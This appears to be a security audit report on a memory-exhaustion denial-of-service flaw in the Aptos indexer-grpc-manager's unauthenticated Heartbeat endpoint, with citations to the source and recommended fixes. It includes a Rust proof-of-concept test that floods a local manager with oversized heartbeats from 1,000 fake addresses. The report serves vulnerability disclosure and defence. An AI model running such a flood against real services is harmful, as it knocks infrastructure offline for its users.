# Audit Report

## Title
Memory Exhaustion via Unauthenticated Heartbeat Endpoint in Indexer gRPC Manager

## Summary
The indexer-grpc-manager service accepts unauthenticated heartbeat messages up to 256 MB in size and stores them in unbounded in-memory collections, allowing attackers to exhaust system memory through repeated malicious requests with crafted service information containing large stream metadata.

## Finding Description

The indexer-grpc-manager gRPC service defines `MAX_MESSAGE_SIZE` as 256 MB [1](#0-0)  and applies this limit to both encoding and decoding messages [2](#0-1) .

The service exposes a `Heartbeat` RPC endpoint that accepts `HeartbeatRequest` messages containing `ServiceInfo` with various metadata types [3](#0-2) . Critically, this endpoint:

1. **Lacks authentication**: No authentication checks exist in the indexer-grpc-manager (confirmed by absence of auth token validation)

2. **Stores arbitrary addresses**: The `address` field from incoming requests is used directly as a key in a `DashMap` without validation [4](#0-3) 

3. **Retains full message payloads**: Each heartbeat's `ServiceInfo` is stored completely in memory in `VecDeque` collections, with up to 100 states per address [5](#0-4) 

4. **Accepts large nested structures**: The `StreamInfo` can contain repeated `ActiveStream` entries, each with `StreamProgress` containing repeated `StreamProgressSampleProto` samples [6](#0-5) , allowing messages to approach the 256 MB limit.

**Attack Path:**
An attacker can send `HeartbeatRequest` messages with:
- Unique `address` values for each request (creating new DashMap entries)
- `LiveDataServiceInfo` containing `StreamInfo` with thousands of `ActiveStream` entries
- Each stream containing thousands of `StreamProgressSampleProto` samples
- Each crafted message consuming 5-50 MB when serialized

Since the `DashMap` has no size limit and each address can store 100 states [7](#0-6) , an attacker creating 1,000 unique addresses with 100 states of 10 MB each would consume approximately 1 TB of memory.

The server builder lacks concurrency limits [8](#0-7) , allowing many concurrent connections to rapidly exhaust available memory.

## Impact Explanation

This vulnerability enables denial of service against indexer-grpc-manager nodes through memory exhaustion, qualifying as **High severity** under the Aptos bug bounty category "API crashes". 

The indexer-grpc-manager is critical infrastructure that:
- Coordinates data distribution between full nodes, data services, and indexers
- Manages service discovery and load balancing for indexer infrastructure
- Handles heartbeat monitoring for availability

An out-of-memory crash would disrupt the entire indexer ecosystem, preventing applications from accessing historical blockchain data until the service is manually restarted and potentially reconfigured with address restrictions.

While this does not directly impact consensus or validator operations, it violates the Resource Limits invariant (#9) which requires "all operations must respect gas, storage, and computational limits" - extended to include memory constraints for infrastructure services.

## Likelihood Explanation

**Likelihood: High**

The attack requires:
- Network access to the gRPC manager endpoint (typically exposed for legitimate data services)
- Ability to send gRPC requests (standard tooling available)
- No authentication or special privileges
- No rate limiting to overcome

The attack is trivial to execute:
- No cryptographic operations required
- Standard gRPC clients can send malicious messages
- Each connection can send multiple requests before backpressure applies
- Multiple concurrent connections amplify the attack

An attacker could exhaust memory within minutes using a simple script to send crafted heartbeat messages with varying addresses.

## Recommendation

Implement multiple defense layers:

1. **Add authentication**: Require authentication tokens for heartbeat endpoints, similar to the data service's `whitelisted_auth_tokens` mechanism

2. **Implement rate limiting**: Add per-IP and global rate limits for heartbeat requests

3. **Add address validation**: Maintain a whitelist of known service addresses and reject unexpected ones

4. **Set concurrency limits**: Configure the tonic Server with `concurrency_limit_per_connection()` to bound concurrent streams

5. **Add memory bounds**: Implement a global memory budget for stored states with LRU eviction

6. **Reduce MAX_MESSAGE_SIZE**: Consider if 256 MB is necessary for heartbeat messages; legitimate heartbeats should be much smaller

Example fix for config.rs:
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
pub(crate) const MAX_HEARTBEAT_MESSAGE_SIZE: usize = 1 * (1 << 20); // 1 MB for heartbeats
pub(crate) const MAX_CONCURRENT_STREAMS_PER_CONNECTION: usize = 10;
pub(crate) const MAX_ADDRESSES_IN_METADATA: usize = 1000;
```

Example fix for grpc_manager.rs adding concurrency limits:
```rust
let server = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .concurrency_limit_per_connection(MAX_CONCURRENT_STREAMS_PER_CONNECTION)
    .add_service(service);
```

## Proof of Concept

```rust
// PoC demonstrating memory exhaustion attack
// Add to ecosystem/indexer-grpc/indexer-grpc-manager/src/test.rs

#[tokio::test]
async fn test_heartbeat_memory_exhaustion() {
    use aptos_protos::indexer::v1::{
        grpc_manager_client::GrpcManagerClient,
        HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
        StreamInfo, ActiveStream, StreamProgress, StreamProgressSampleProto,
    };
    use aptos_protos::util::timestamp::Timestamp;
    use tonic::codec::CompressionEncoding;
    
    // Assume manager is running on localhost:50051
    let channel = tonic::transport::Channel::from_static("http://localhost:50051")
        .connect()
        .await
        .unwrap();
    
    let mut client = GrpcManagerClient::new(channel)
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd);
    
    // Create malicious heartbeat with large stream info
    for address_id in 0..1000 {
        let mut active_streams = vec![];
        
        // Create many active streams
        for stream_id in 0..1000 {
            let mut samples = vec![];
            // Add many progress samples per stream
            for sample_id in 0..100 {
                samples.push(StreamProgressSampleProto {
                    timestamp: Some(Timestamp { seconds: 1234567890, nanos: 0 }),
                    version: sample_id as u64,
                    size_bytes: 1000000,
                });
            }
            
            active_streams.push(ActiveStream {
                id: format!("stream-{}", stream_id),
                start_time: Some(Timestamp { seconds: 1234567890, nanos: 0 }),
                start_version: 0,
                end_version: Some(1000000),
                progress: Some(StreamProgress { samples }),
            });
        }
        
        let service_info = ServiceInfo {
            address: Some(format!("malicious-address-{}", address_id)),
            info: Some(aptos_protos::indexer::v1::service_info::Info::LiveDataServiceInfo(
                LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: Some(Timestamp { seconds: 1234567890, nanos: 0 }),
                    known_latest_version: Some(1000000),
                    stream_info: Some(StreamInfo { active_streams }),
                    min_servable_version: Some(0),
                }
            )),
        };
        
        let request = HeartbeatRequest {
            service_info: Some(service_info),
        };
        
        // Send heartbeat - this will consume significant memory
        let _ = client.heartbeat(request).await;
    }
    
    // After 1000 addresses * ~5MB per message = ~5GB consumed
    // Service will likely OOM on systems with limited memory
}
```

**Notes**

This vulnerability specifically affects the indexer-grpc-manager infrastructure component, not the core Aptos blockchain consensus or execution layers. However, it represents a valid denial-of-service attack against critical ecosystem infrastructure that requires authentication, rate limiting, and resource bounds to mitigate.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L99-100)
```rust
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-104)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L37-37)
```rust
const MAX_NUM_OF_STATES_TO_KEEP: usize = 100;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-508)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L22-33)
```text
message ActiveStream {
  string id = 1;
  optional aptos.util.timestamp.Timestamp start_time = 2;
  uint64 start_version = 3;
  optional uint64 end_version = 4;

  optional StreamProgress progress = 5;
}

message StreamInfo {
  repeated ActiveStream active_streams = 1;
}
```
